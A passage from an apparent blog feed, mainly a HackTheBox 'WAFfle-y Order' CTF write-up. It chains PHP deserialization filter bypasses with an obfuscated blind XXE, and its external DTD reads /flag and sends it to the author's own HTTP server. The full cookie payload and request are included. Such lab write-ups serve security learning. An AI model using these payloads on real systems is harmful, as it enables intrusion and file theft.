https://www.oracle.com/java/technologies/downloads/¬†&#8617;&#xfe0e;                 https://developer.android.com/studio#:~:text=Command%20line%20tools%20only¬†&#8617;&#xfe0e;                 https://developer.android.com/studio/releases/platform-tools¬†&#8617;&#xfe0e;                 https://developer.android.com/tools¬†&#8617;&#xfe0e;                 https://developer.android.com/tools/sdkmanager¬†&#8617;&#xfe0e;                 https://developer.android.com/tools/avdmanager¬†&#8617;&#xfe0e;                 https://stackoverflow.com/questions/50420374/how-to-cold-boot-emulators-running-api-27-on-android-studio¬†&#8617;&#xfe0e;                 https://stackoverflow.com/questions/15100251/avd-hardware-buttons-not-enabled¬†&#8617;&#xfe0e;                 https://developer.android.com/studio/run/emulator-networking¬†&#8617;&#xfe0e;                 https://www.youtube.com/watch?v=CJR_BSIStmE¬†&#8617;&#xfe0e;                 https://docs.mitmproxy.org/stable/howto-install-system-trusted-ca-android/¬†&#8617;&#xfe0e;"
  },
  
  {
    "title": "WAF bypass and vulnerability chain exploiting parser differentials",
    "url": "/posts/waf-bypass-exploiting-parser-differentials/",
    "categories": "Articles & Writeups, Web Hacking",
    "tags": "hackthebox, PHP, deserialization",
    "date": "2023-04-12 00:00:00 +0200",
    "content": "Introduction  WAFfle-y Order is a medium-difficulty web challenge from HackTheBox that involves attacking a custom application vulnerable to XXE Injection and PHP arbitrary deserialization bypassing two different WAF regexes.  Improved skills    Code review for PHP applications   Exploit PHP deserialization vulnerabilities   Exploit XML External Entity Injection vulnerabilities   Bypass regex-based WAF using parser differentials   Video     Writeup [TL;DR]  WAFfle-y Order is a medium-difficulty web challenge from HackTheBox that involves attacking a custom application where we can order some Waffles or Ice Cream.     Remember what‚Äôs important in life: friends ü§ù, WAFfles üßá, work üíº. or üßá WAFfles. ü§ù friends. üíº work. Doesn‚Äôt matter. But work is third ü•â. This is why we launched our new WAFfle-y cute ordering system API for our beloved customers and friends! But remember, don‚Äôt get all filled up on those regexes yet, we also offer Ice Scream üç¶!   Introduction and setup  For this challenge, we are given the application source code, a docker environment to reproduce locally the same server infrastructure, and a remote server to connect to get the flag.  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/Challenge/Web/web_waffley_order] ‚îî‚îÄ$ tree web_waffley_order/ web_waffley_order/ ‚îú‚îÄ‚îÄ Dockerfile ‚îú‚îÄ‚îÄ build_docker.sh ‚îú‚îÄ‚îÄ challenge ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Router.php ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ assets ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ css ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ main.css ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ favicon.ico ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ js ‚îÇ¬†¬† ‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ main.js ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ controllers ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ OrderController.php ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ index.php ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ models ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ UserModel.php ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ XmlParserModel.php ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ views ‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ menu.php ‚îú‚îÄ‚îÄ config ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ fpm.conf ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ nginx.conf ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ supervisord.conf ‚îî‚îÄ‚îÄ flag   We can start building the docker environment while taking a look at the application:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/Challenge/Web/web_waffley_order] ‚îî‚îÄ$ cat build_docker.sh #!/bin/bash docker build -t web_waffley_order . docker run --name=web_waffley_order --rm -p1337:80 -it web_waffley_order  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/Challenge/Web/web_waffley_order] ‚îî‚îÄ$ chmod +x build_docker.sh   Information Gathering  The application at-a-glance üîç  Here we can‚Äôt do much, we can only order some WAFfles or some Ice Cream and nothing more.    By looking at the request sent to the server, we can observe that it sends a JSON object containing our order and it also uses a serialized PHPSESSID to identify the user:  POST /api/order HTTP/1.1 Host: localhost:1337 Cookie: PHPSESSID=Tzo5OiJVc2VyTW9kZWwiOjE6e3M6ODoidXNlcm5hbWUiO3M6MTA6Imd1ZXN0XzYyNWQiO30%3D  {\"table_num\":\"test\",\"food\":\"WAFfles\"}   HTTP/1.1 200 OK Server: nginx Date: Mon, 18 Apr 2022 20:01:51 GMT Content-Type: text/html; charset=UTF-8 Connection: close X-Powered-By: PHP/7.4.28 Content-Length: 102  {\"status\":\"success\",\"message\":\"Hello guest_625d, your WAFfles order has been submitted successfully.\"}   The content of PHPSESSID is the following: $ echo 'Tzo5OiJVc2VyTW9kZWwiOjE6e3M6ODoidXNlcm5hbWUiO3M6MTA6Imd1ZXN0XzYyNWQiO30=' | base64 -d O:9:\"UserModel\":1:{s:8:\"username\";s:10:\"guest_625d\";}   Usually, serialized data can be very dangerous, especially when they can be arbitrarily modified like in this case. Let‚Äôs keep it in mind for later.  Source code review  Since the application doesn‚Äôt offer many features, let‚Äôs take a look at the code to better understand the internals of the program while we wait for docker to finish.  The build_docker.sh script, the Dockerfile, and the /config folder do not contain very useful information for this challenge. They just provide a bunch of configurations to correctly set up the environment:  Dockerfile  FROM alpine:edge  # Setup usr RUN adduser -D -u 1000 -g 1000 -s /bin/sh www  # Install system packages RUN apk add --no-cache --update supervisor nginx  # Install PHP dependencies RUN apk add --no-cache --update php7-fpm php7-xml php7-simplexml php7-json  # Configure php-fpm and nginx COPY config/fpm.conf /etc/php7/php-fpm.d/www.conf COPY config/supervisord.conf /etc/supervisord.conf COPY config/nginx.conf /etc/nginx/nginx.conf  # Copy challenge files COPY challenge /www  COPY flag /flag  # Setup permissions RUN chown -R www:www /var/lib/nginx  # Expose the port nginx is listening on EXPOSE 80  # Populate database and start supervisord CMD /usr/bin/supervisord -c /etc/supervisord.conf   build_docker.sh  #!/bin/bash docker build -t web_waffley_order . docker run --name=web_waffley_order --rm -p1337:80 -it web_waffley_order   The web application code instead is located under the /challenge folder.  index.php is the application entry point. Here we can see that some PHP controllers and models are included, then an XML file is read and processed by the XmlParserModel class, and then the PHPSESSID is checked and eventually set up.  &lt;?php spl_autoload_register(function ($name){ \tif (preg_match('/Controller$/', $name)) \t{ \t\t$name = \"controllers/${name}\"; \t} \tif (preg_match('/Model$/', $name)) \t{ \t\t$name = \"models/${name}\"; \t} \tinclude_once \"${name}.php\"; });  new XmlParserModel(file_get_contents('.env'));  if (empty($_COOKIE['PHPSESSID'])) { \t$user = new UserModel; \t$user-&gt;username = substr(uniqid('guest_'), 0, 10); \tsetcookie( \t\t'PHPSESSID',  \t\tbase64_encode(serialize($user)),  \t\ttime()+60*60*24,  \t\t'/' \t); }  $router = new Router();  $router-&gt;new('GET', '/', fn($router) =&gt; $router-&gt;view('menu')); $router-&gt;new('POST', '/api/order', 'OrderController@order');  die($router-&gt;match());   Then a bunch of routes is defined from the Router class contained inside Router.php, one of which is the one performing the user order through the OrderController class.  &lt;?php function safe_object($serialized_data) { \t$matches = []; \t$num_matches = preg_match_all('/(^|;)O:\\d+:\"([^\"]+)\"/', $serialized_data, $matches);  \tfor ($i = 0; $i &lt; $num_matches; $i++) { \t\t$methods = get_class_methods($matches[2][$i]); \t\tforeach ($methods as $method) { \t\t\tif (preg_match('/^__.*$/', $method) != 0) { \t\t\t\tdie(\"Unsafe method: ${method}\"); \t\t\t} \t\t} \t} }  class OrderController { \tpublic function order($router) \t{ \t\t$body = file_get_contents('php://input'); \t\t$cookie = base64_decode($_COOKIE['PHPSESSID']); \t\tsafe_object($cookie); \t\t$user = unserialize($cookie);  \t\tif ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/json') \t\t{ \t\t\t$order = json_decode($body); \t\t\tif (!$order-&gt;food)  \t\t\t\treturn json_encode([ \t\t\t\t\t'status' =&gt; 'danger', \t\t\t\t\t'message' =&gt; 'You need to select a food option first' \t\t\t\t]); \t\t\tif ($_ENV['debug']) \t\t\t{ \t\t\t\t$date = date('d-m-Y G:i:s'); \t\t\t\tfile_put_contents('/tmp/orders.log', \"[${date}] ${body} by {$user-&gt;username}\\n\", FILE_APPEND); \t\t\t} \t\t\treturn json_encode([ \t\t\t\t'status' =&gt; 'success', \t\t\t\t'message' =&gt; \"Hello {$user-&gt;username}, your {$order-&gt;food} order has been submitted successfully.\" \t\t\t]); \t\t} \t\telse \t\t{ \t\t\treturn $router-&gt;abort(400); \t\t} \t} }   Taking a closer look at that class we can see that it reads the PHPSESSID and then it tries to unserialize it. Between the two operations, however, the backend verifies which methods are available for every object using a very specific regex.  &lt;?php function safe_object($serialized_data) { \t$matches = []; \t$num_matches = preg_match_all('/(^|;)O:\\d+:\"([^\"]+)\"/', $serialized_data, $matches);  \tfor ($i = 0; $i &lt; $num_matches; $i++) { \t\t$methods = get_class_methods($matches[2][$i]); \t\tforeach ($methods as $method) { \t\t\tif (preg_match('/^__.*$/', $method) != 0) { \t\t\t\tdie(\"Unsafe method: ${method}\"); \t\t\t} \t\t} \t} } ...   If the regex matches some PHP magic methods 1 - so the one starting with __ - then the application returns an error, otherwise, it sets up the user object and then returns the message that pops out when submitting the order.  The OrderController class also checks if the debug environment variable is set and if it‚Äôs true, it writes some logs.  ... if ($_ENV['debug']) { \t$date = date('d-m-Y G:i:s'); \tfile_put_contents('/tmp/orders.log', \"[${date}] ${body} by {$user-&gt;username}\\n\", FILE_APPEND); } ...   Ok, up to here the application seems very secure, however, we still need to take a look at the two classes used to instantiate the two objects UserModel and XmlParserModel.  UserModel looks very basic, it just contains the username property.  &lt;?php class UserModel { \tpublic string $username; }   XmlParserModel on the other hand appears very peculiar.  &lt;?php class XmlParserModel { \tprivate string $data; \tprivate array $env;  \tpublic function __construct($data) \t{ \t\t$this-&gt;data = $data; \t}  \tpublic function __wakeup() \t{ \t\tif (preg_match_all(\"/&lt;!(?:DOCTYPE|ENTITY)(?:\\s|%|&amp;#[0-9]+;|&amp;#x[0-9a-fA-F]+;)+[^\\s]+\\s+(?:SYSTEM|PUBLIC)\\s+[\\'\\\"]/im\", $this-&gt;data)) \t\t{ \t\t\tdie('Unsafe XML'); \t\t} \t\t$env = @simplexml_load_string($this-&gt;data, 'SimpleXMLElement', LIBXML_NOENT);  \t\tif (!$env)  \t\t{ \t\t\tdie('Malformed XML'); \t\t}  \t\tforeach ($env as $key =&gt; $value) \t\t{ \t\t\t$_ENV[$key] = (string)$value; \t\t} \t} }   The class implements two magic methods:    __construct()2, which is invoked every time an object is created and simply assigns the passed data to the object property,   and __wakeup()3, which is invoked every time a script tries to call an object as a function or every time an unserialize() function is invoked on that object. This method verifies that the content of the data properties is a safe XML, then it converts the XML string into an object using simplexml_load_string and finally, it creates an environment variable for every key contained inside the XML.   Exploitation  By looking through the code I noticed different things that perhaps can be exploited or used during an exploitation chain:     index.php and Router.php both contain some include that maybe can be used to exploit a Path Traversal or a Local File Inclusion,   the OrderController class writes some logs that maybe can be used in combination with the LFI,   the same class also uses the PHP Complex Syntax 4, that in some cases can lead to RCE,   and unserialize user-controllable data, which can potentially allow the injection of PHP Object to alter the program logic.   There are so many possibilities, but which is the correct one?  Or even worse: is one of these paths the right one?  In this challenge, users can only control 4 data: the ordered food, the table number, the serialized cookie, and the XML file parsed by the application.  Searching where the ordered food is used didn‚Äôt highlight dangerous uses, so we can exclude this option. The same can be done with the table number, which even never appears within the code.  The remaining option is to exploit the PHPSESSID cookie and try to inject some kind of PHP object.  PHP Object Injection (PHP deserialization)     The application uses the PHPSESSID cookie to pass a PHP object to the server that will be then deserialized. Assigning to the PHPSESSID cookie other valid serialized objects, it is possible to deserialize arbitrary PHP objects and alter the program logic.   I wrote a simple PHP script that serializes two custom objects, one using the UserModel class and one using the XmlParserModel.  test-serialize.php &lt;?php class XmlParserModel { \tpublic string $data; \tpublic array $env = []; \tpublic string $username;  \tpublic function __construct($data) { \t\t$this-&gt;data = $data; \t} }  class UserModel { \tpublic string $username; }  echo \"--- User ---\\n\"; $user = new UserModel(); $user-&gt;username = \"0xbro\"; print_r($user); echo base64_encode(serialize($user));  echo \"\\n\\n--- XML ---\\n\"; $xml = new XmlParserModel(file_get_contents('.env')); print_r($xml); echo base64_encode(serialize($xml));   As expected, providing the first serialized object to the backend nothing happened. Instead, providing an XmlParserModel object caused the server to fail, telling us that we provided an object having an unsafe method.  HTTP/1.1 200 OK ...  Unsafe method: __construct   We don‚Äôt get a successful response back because the serialized object contains unsafe methods, but the fact that the server responds indicates that the request was successful and the server tries to deserialize the arbitrary object.  safe_object WAF bypass     The regex is misconfigured and do not consider custom serialized objects using the C: syntax. Using those objects it is possible to bypass the regex and deserialize dangerous objects.   After some research I found this wonderful writeup 5 from MegadodoPubblications talking about a Remote Code Execution in Composr. Although the target is different than ours, going through the article I found a really interesting thing. The author had to bypass the same regex we‚Äôre facing.  validation function function secure_serialized_data(&amp;$serialized_data) {     $matches = array();     $num_matches = preg_match_all('#(^|;)O:\\d+:\"([^\"]+)\"#', $serialized_data, $matches);     for ($i = 0; $i &lt; $num_matches; $i++) {          $methods = get_class_methods($matches[2][$i]);          foreach ($methods as $method) {             if (preg_match('#^__.*$#', $method) != 0) {                 $serialized_data = serialize(null);                 return;             }         }     } }   The writeup shows three different bypasses:    The first one uses a plus sign to bypass the regex, however, starting from PHP 7.2 it doesn‚Äôt work anymore. For this challenge we are using PHP 7, so we can scrap this first option.   The second one exploits a parser differential between the regex and the PHP serialized object, tricking the regex into thinking that ;O:10 is the class name of the object and so hiding ‚ÄúHelloWorld‚Äù from the regex.   Finally, the third one uses a pretty unknown and deprecated feature that allows the creation of custom serialized objects starting with C: instead of the classic syntax.      Traditional PHP basic types variables follow standard rules:        null values become N;     booleans become b: and the value of the boolean integers become i:number;     strings become s: the number of characters : the string     objects become O: the length of the object name : object name : object size and then all the properties inside brackets     arrays become a: the length of the array and then all the key;value definitions inside brackets       However, by implementing the Serializable interface, it is possible to serialize data using the C: format.   I started using the same code provided in the writeup 6, but it didn‚Äôt work as expected. It returned a different serialized object that didn‚Äôt use either the C: format or the ;: trick to bypass the regex, but instead was a pretty standard serialized object.  Because the official PHP documentation [^PHPinternals] says that inside serialized object created using the Serializable interface there could be any payload between braces, I decided to create a script that simply injects my serialized object within the example provided in the write-up.  The PHP code declares an XmlParserModel class equal to the application‚Äôs one, then it creates the object reading our previous XML payload, serializes it, calculates the corresponding length, and finally places it inside the ‚Äúcontainer‚Äù shown on GitHub.  c_serialize.php  &lt;?php class XmlParserModel { \tpublic string $data; \tpublic array $env; \tpublic string $username;  \tpublic function __construct($data) { \t\t$this-&gt;data = $data; \t} }  $xml = new XmlParserModel(file_get_contents('.env')); $xml-&gt;username = 'h4ck3d'; $payload = serialize($xml);  $l = 11 + strlen($payload ); echo 'PHPSESSID='.base64_encode('C:19:\"SplDoublyLinkedList\":' . $l . ':{i:0;:' . $payload . ':i:42;}');   Testing the result on regex101 we can see that this time the regex does not match anymore.  C:19:\"SplDoublyLinkedList\":112:{i:0;:O:14:\"XmlParserModel\":2:{s:4:\"data\";s:28:\"&lt;env&gt;&lt;debug&gt;1&lt;/debug&gt;&lt;/env&gt;\";s:8:\"username\";s:6:\"h4ck3d\";}:i:42;}     XML External Entity Injection  We know that we can unserialize arbitrary data, but the application does not contain dangerous functions that could allow code execution. What we can do now?  Because the only interesting class we can use is the XmlParserModel, let‚Äôs start analyzing every single line of code.  The regex is constructed in a way that matches any possible XML External Entity attack containing the SYSTEM o PUBLIC keyword. This means that code execution can‚Äôt be achieved without bypassing this regex, but why did developers implement this rule? Probably they were worried that XXE Injection could be exploited, but why there is such control? Where is the flaw?     simplexml_load_string is called using a dangerous parameter that enables entity substitution, facilitating XML External Entity attacks.   We potentially have a deserialization vulnerability that may allow us to unserialize an XmlParserModel object vulnerable to XXE. Let‚Äôs try it out!  I created a basic XML containing an XML entity that overrides the debug key to any value.  .env &lt;!--?xml version=\"1.0\" ?--&gt; &lt;!DOCTYPE replace [&lt;!ENTITY xxe \"asd\"&gt; ]&gt; &lt;env&gt;   &lt;debug&gt;0&lt;/debug&gt;   &lt;debug&gt;&amp;xxe;&lt;/debug&gt; &lt;/env&gt;   In this way we can verify if it works, using the creation of the log file in /tmp as a reference. If the file is created, it means that the entity works, otherwise, it means that the debug value is not overwritten and therefore the code block is not executed.  First, we have to ensure that the log file does not exist, then we can use the same PHP script used before (test-serialize.php) to generate our cookie and finally we can send it to the server.  We can notice that the file was created, meaning that we can use entities and external entities in our exploitation chain.  # cat /tmp/orders.log [07-04-2023] {\"table_num\":\"1337\",\"food\":\"WAFfles\"} by 0xbro   Unfortunately, the data contained in our XML is not reflected anywhere in the application. This means that we cannot exfiltrate data by reading it through the app, but we must necessarily use OAST 7 techniques. Using external entities we can force the web application to perform an HTTP request to our server, sending us any data we extracted using other entities.  To test it, we can use the same payload as before (test-serialize.php), this time implementing an external entity called ‚Äúblind‚Äù to try to contact our server.  .env (blind)  &lt;!--?xml version=\"1.0\" ?--&gt; &lt;!DOCTYPE foo [  &lt;!ENTITY blind SYSTEM \"http://192.168.1.199/test.txt\"&gt; ]&gt;  &lt;env&gt;   &lt;debug&gt;&amp;blind;&lt;/debug&gt;  &lt;/env&gt;   $ sudo python3 -m http.server 80 ... 172.16.0.2 - - [07/Apr/2023 17:42:19] \"GET /test.txt HTTP/1.0\" 404 -   We received an HTTP request. This means that we can use external entities to send and retrieve data.  To concatenate multiple entities inside the Document Type Definition we can use parameter entities 8, special XML entities that can only be referenced elsewhere within the DTD. They use the ‚Äú%‚Äù character before their name but they can be referenced like traditional XML entities. We can place the malicious payload inside an external DTD and then download it using a simple parameter entity.  I created an external DTD named test.dtd containing the malicious payload and I reference it inside the .env XML file.  test.dtd  &lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/flag\"&gt; &lt;!ENTITY % eval \"&lt;!ENTITY &amp;#x25; exf SYSTEM 'http://192.168.1.199/?x=%file;'&gt;\"&gt; %eval;   .env (exfiltrate-ext-dtd)  &lt;!--?xml version=\"1.0\" ?--&gt; &lt;!DOCTYPE foo [  &lt;!ENTITY % ext SYSTEM \"http://192.168.1.199/test.dtd\"&gt; %ext; %exf; ]&gt; &lt;env&gt; &lt;debug&gt;1&lt;/debug&gt; &lt;/env&gt;   In this way, the application should download the external file, replace the various entity with the corresponding values and finally send to my server a request containing the value of the flag, encoded in base64.  Disabling the preg_match_all  filter, it works.  $ sudo python3 -m http.server 80 ... 172.16.0.2 - - [07/Apr/2023 17:42:19] \"GET /test.dtd HTTP/1.0\" 200 - 172.16.0.2 - - [07/Apr/2023 17:42:19] \"GET /?x=fake-flag-for-testing HTTP/1.0\" 200 -   Now we have to find a way to bypass this second regex preventing us to inject malicious external entities.  preg_match_all WAF bypass  Using a site like regex101 we can analyze the regex in detail and see if it matches our payload.    Unfortunately, it does, but as we saw from the Portswigger site 9 and also from this other post 10, we can use entities inside XML strings to try to find a workaround for restricted XXE.     The regex is misconfigured and do not consider entities. Using Hex entities it is possible to bypass the regex, include dangerous external entities and exploit the XXE Injection vulnerability.   To bypass this regex, so, we can implement another XML parameter entity, this time simply containing our encoded payload.  .env (obfuscated)  &lt;!--?xml version=\"1.0\" ?--&gt; &lt;!DOCTYPE foo [  &lt;!ENTITY % cont \"&amp;#x3c;&amp;#x21;&amp;#x45;&amp;#x4e;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x25;&amp;#x20;&amp;#x65;&amp;#x78;&amp;#x74;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4d;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x39;&amp;#x32;&amp;#x2e;&amp;#x31;&amp;#x36;&amp;#x38;&amp;#x2e;&amp;#x31;&amp;#x35;&amp;#x37;&amp;#x2e;&amp;#x31;&amp;#x32;&amp;#x38;&amp;#x2f;&amp;#x74;&amp;#x65;&amp;#x73;&amp;#x74;&amp;#x2e;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x3e;\"&gt; %cont; %ext; %exf; ]&gt; &lt;env&gt;   &lt;debug&gt;1&lt;/debug&gt; &lt;/env&gt;   As we can see, the regex does not match anymore, while the exploit is still working.      Final chain  .env  &lt;!--?xml version=\"1.0\" ?--&gt; &lt;!DOCTYPE foo [  &lt;!ENTITY % cont \"&amp;#x3c;&amp;#x21;&amp;#x45;&amp;#x4e;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x25;&amp;#x20;&amp;#x65;&amp;#x78;&amp;#x74;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4d;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x6e;&amp;#x67;&amp;#x72;&amp;#x6f;&amp;#x6b;&amp;#x2d;&amp;#x75;&amp;#x72;&amp;#x6c;&amp;#x2f;&amp;#x74;&amp;#x65;&amp;#x73;&amp;#x74;&amp;#x2e;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x3e;\"&gt; %cont; %ext; %exf; ]&gt; &lt;env&gt;   &lt;debug&gt;1&lt;/debug&gt; &lt;/env&gt;      The obfuscated line is &lt;!ENTITY % ext SYSTEM \"http://ngrok-url/test.dtd\"&gt;   test.dtd  &lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/flag\"&gt; &lt;!ENTITY % eval \"&lt;!ENTITY &amp;#x25; exf SYSTEM 'http://ngrok-url/?x=%file;'&gt;\"&gt; %eval;   Resulting XmlParserModel object  PHPSESSID=QzoxOToiU3BsRG91Ymx5TGlua2VkTGlzdCI6NTA0OntpOjA7Ok86MTQ6IlhtbFBhcnNlck1vZGVsIjoyOntzOjQ6ImRhdGEiO3M6NDE5OiI8IS0tP3htbCB2ZXJzaW9uPSIxLjAiID8tLT4KPCFET0NUWVBFIGZvbyBbIAo8IUVOVElUWSAlIGNvbnQgIiYjeDNjOyYjeDIxOyYjeDQ1OyYjeDRlOyYjeDU0OyYjeDQ5OyYjeDU0OyYjeDU5OyYjeDIwOyYjeDI1OyYjeDIwOyYjeDY1OyYjeDc4OyYjeDc0OyYjeDIwOyYjeDUzOyYjeDU5OyYjeDUzOyYjeDU0OyYjeDQ1OyYjeDRkOyYjeDIwOyYjeDIyOyYjeDY4OyYjeDc0OyYjeDc0OyYjeDcwOyYjeDNhOyYjeDJmOyYjeDJmOyYjeDZlOyYjeDY3OyYjeDcyOyYjeDZmOyYjeDZiOyYjeDJkOyYjeDc1OyYjeDcyOyYjeDZjOyYjeDJmOyYjeDc0OyYjeDY1OyYjeDczOyYjeDc0OyYjeDJlOyYjeDY0OyYjeDc0OyYjeDY0OyYjeDIyOyYjeDNlOyI+CiVjb250OwolZXh0OwolZXhmOwpdPgo8ZW52PgogIDxkZWJ1Zz4xPC9kZWJ1Zz4KPC9lbnY+CiI7czo4OiJ1c2VybmFtZSI7czo2OiJoNGNrM2QiO306aTo0Mjt9  echo 'QzoxOToiU3BsRG91Ymx5TGlua2VkTGlzdCI6NTA0OntpOjA7Ok86MTQ6IlhtbFBhcnNlck1vZGVsIjoyOntzOjQ6ImRhdGEiO3M6NDE5OiI8IS0tP3htbCB2ZXJzaW9uPSIxLjAiID8tLT4KPCFET0NUWVBFIGZvbyBbIAo8IUVOVElUWSAlIGNvbnQgIiYjeDNjOyYjeDIxOyYjeDQ1OyYjeDRlOyYjeDU0OyYjeDQ5OyYjeDU0OyYjeDU5OyYjeDIwOyYjeDI1OyYjeDIwOyYjeDY1OyYjeDc4OyYjeDc0OyYjeDIwOyYjeDUzOyYjeDU5OyYjeDUzOyYjeDU0OyYjeDQ1OyYjeDRkOyYjeDIwOyYjeDIyOyYjeDY4OyYjeDc0OyYjeDc0OyYjeDcwOyYjeDNhOyYjeDJmOyYjeDJmOyYjeDZlOyYjeDY3OyYjeDcyOyYjeDZmOyYjeDZiOyYjeDJkOyYjeDc1OyYjeDcyOyYjeDZjOyYjeDJmOyYjeDc0OyYjeDY1OyYjeDczOyYjeDc0OyYjeDJlOyYjeDY0OyYjeDc0OyYjeDY0OyYjeDIyOyYjeDNlOyI+CiVjb250OwolZXh0OwolZXhmOwpdPgo8ZW52PgogIDxkZWJ1Zz4xPC9kZWJ1Zz4KPC9lbnY+CiI7czo4OiJ1c2VybmFtZSI7czo2OiJoNGNrM2QiO306aTo0Mjt9' | base64 -d C:19:\"SplDoublyLinkedList\":504:{i:0;:O:14:\"XmlParserModel\":2:{s:4:\"data\";s:419:\"&lt;!--?xml version=\"1.0\" ?--&gt; &lt;!DOCTYPE foo [  &lt;!ENTITY % cont \"&amp;#x3c;&amp;#x21;&amp;#x45;&amp;#x4e;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x25;&amp;#x20;&amp;#x65;&amp;#x78;&amp;#x74;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4d;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x6e;&amp;#x67;&amp;#x72;&amp;#x6f;&amp;#x6b;&amp;#x2d;&amp;#x75;&amp;#x72;&amp;#x6c;&amp;#x2f;&amp;#x74;&amp;#x65;&amp;#x73;&amp;#x74;&amp;#x2e;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x3e;\"&gt; %cont; %ext; %exf; ]&gt; &lt;env&gt;   &lt;debug&gt;1&lt;/debug&gt; &lt;/env&gt; \";s:8:\"username\";s:6:\"h4ck3d\";}:i:42;}   HTTP request:  POST /api/order HTTP/1.1 Host: 157.245.46.51:30974 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1:1337/ Content-Type: application/json Origin: http://127.0.0.1:1337 Content-Length: 18 Connection: close Cookie: PHPSESSID=&lt;@base64&gt;C:19:\"SplDoublyLinkedList\":504:{i:0;:O:14:\"XmlParserModel\":2:{s:4:\"data\";s:419:\"&lt;!--?xml version=\"1.0\" ?--&gt; &lt;!DOCTYPE foo [  &lt;!ENTITY % cont \"&amp;#x3c;&amp;#x21;&amp;#x45;&amp;#x4e;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x25;&amp;#x20;&amp;#x65;&amp;#x78;&amp;#x74;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4d;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x6e;&amp;#x67;&amp;#x72;&amp;#x6f;&amp;#x6b;&amp;#x2d;&amp;#x75;&amp;#x72;&amp;#x6c;&amp;#x2f;&amp;#x74;&amp;#x65;&amp;#x73;&amp;#x74;&amp;#x2e;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x3e;\"&gt; %cont; %ext; %exf; ]&gt; &lt;env&gt;   &lt;debug&gt;1&lt;/debug&gt; &lt;/env&gt; \";s:8:\"username\";s:6:\"h4ck3d\";}:i:42;}&lt;@/base64&gt; Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin  {\"food\":\"WAFfles\"}   Server response:    ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/Challenge/Web/web_waffley_order/exploit] ‚îî‚îÄ$ echo SFRCe3doMF9sM3RfdGgzX2VuYzBkMW5nc18wdXQ/Pz93MDBmLi53bzBmLi53MG9mLi5XQUZmbDNzISF9 | base64 -d HTB{wh0_l3t_th3_enc0d1ngs_0ut???w00f..wo0f..w0of..WAFfl3s!!}   safe_object WAF bypass (second technique)  After having completed the challenge, thanks to SSCx7832 11 I discovered that also the second bypass technique was working and could be used as well to evade the regex checking for malicious PHP objects.     The regex is misconfigured and match any sequence starting with ;, even if it‚Äôs contained inside a string. Using those objects it is possible to bypass the regex and deserialize dangerous objects.   The following script creates two different objects, one using the bypass mentioned before and one using the standard way.  semicolon_bypass.php  &lt;?php  class XmlParserModel {         public string $data;         public array $env;         public string $username;          public function __construct($data) {                 $this-&gt;data = $data;         } }  $serialized_data = serialize([\";O:2:\" =&gt; new XmlParserModel(file_get_contents('.env'))]); echo $serialized_data.\"\\n\\n\"; echo serialize([new XmlParserModel(file_get_contents('.env'))]);  echo 'PHPSESSID='.base64_encode($serialized_data); // a:1:{s:5:\";O:2:\";O:10:\"HelloWorld\":0:{}}; //           ^           ^ // match   begin        end // // And since subsequent matches are continued from // the end of the last match no further match is found   Providing both objects to the regex we can notice that the regex is misconfigured and match any sequence starting with ;, even if it‚Äôs contained inside a string.    ; is used inside 